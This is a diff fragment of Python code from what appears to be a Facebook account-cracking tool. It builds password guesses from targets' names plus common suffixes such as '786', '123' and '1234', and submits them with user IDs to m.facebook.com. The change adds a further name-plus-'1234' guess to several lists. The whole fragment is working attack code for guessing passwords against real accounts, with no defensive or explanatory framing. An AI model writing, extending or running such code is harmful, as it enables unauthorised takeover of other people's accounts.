@@ -534,15 +534,15 @@ class __xxx__:
 
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
 
-                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345"]
+                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345" ,xz[0]+"1234"]
                             
-                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345"]
+                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345" ,xz[0]+"1234"]
                             
-                            pwx = [name, xz[0]+xz[1]]
+                            pwx = [name, xz[0]+xz[1], xz[0]+"1234"]
 
                         else:
 
-                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345"]
+                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345" ,xz[0]+"1234"]
 
                         ssbworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
 
@@ -592,11 +592,11 @@ class __xxx__:
 
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
 
-                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345"]
+                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345" ,xz[0]+"1234"]
 
                         else:
 
-                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345"]
+                            pwx = [xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234",xz[0]+xz[1]+"12345",xz[0]+"1234"]
 
                         ssbworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
 
